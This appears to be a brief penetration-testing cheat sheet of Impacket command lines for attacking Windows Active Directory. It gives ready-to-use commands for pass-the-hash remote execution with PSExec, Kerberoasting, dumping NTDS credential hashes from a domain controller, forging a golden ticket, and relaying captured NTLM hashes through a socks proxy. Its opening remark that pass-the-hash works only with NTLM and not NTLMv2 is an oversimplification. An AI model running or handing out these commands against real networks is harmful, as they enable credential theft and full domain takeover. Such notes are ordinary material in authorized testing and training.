impacket

Passing the hash only works with NTLM, not NTLMv2

PSExec usage:
~~~bash
impacket-psexec "username":password@ipaddress
~~~

PSExec usage with a hash:
~~~bash
impacket-psexec "username":@ipaddress -hashes FullNTLM:Hash
~~~

Kerberoasting SPN with Valid Credentials:
~~~bash
impacket-GetUserSPNs Domain/Username:Password -dc-ip [Domain Controller IP] -request -output krb5_ticket.txt
~~~

SMB Server with SMBv2 Support:
~~~bash
impacket-smbserver share 'pwd' -smb2support
~~~

RPCDump:
~~~bash
impacket-rpcdump @victimIP | egrep 'MS-RPRN|MS-PAR'
~~~

Convert .kirbi to .ccache:
~~~bash
impacket-ticketconverter user.kirbi user.ccache
~~~

dumping ntds from DC using ccache and secrets dump:
~~~bash
KRB5CCNAME=/home/kali/user.ccache impacket-secretsdump -k -no-pass -dc-ip DC_IP -target-ip DC_IP Server.FQDN
~~~

Generate Golden Ticket:
~~~bash
impacket-ticketer -nthash [DA NTLM Hash] -domain-sid [Domain SID] -domain FQDN.Domain DA_User
~~~

NTLMRelayX - Relay SMB/WPAD captured hashes to a target list and create socks proxy to the hosts via SMB and create a file with the captured hashes:
~~~bash
impacket-ntlmrelayx -tf targets.txt -smb2support -socks --output-file Captured_Hashes.txt
~~~
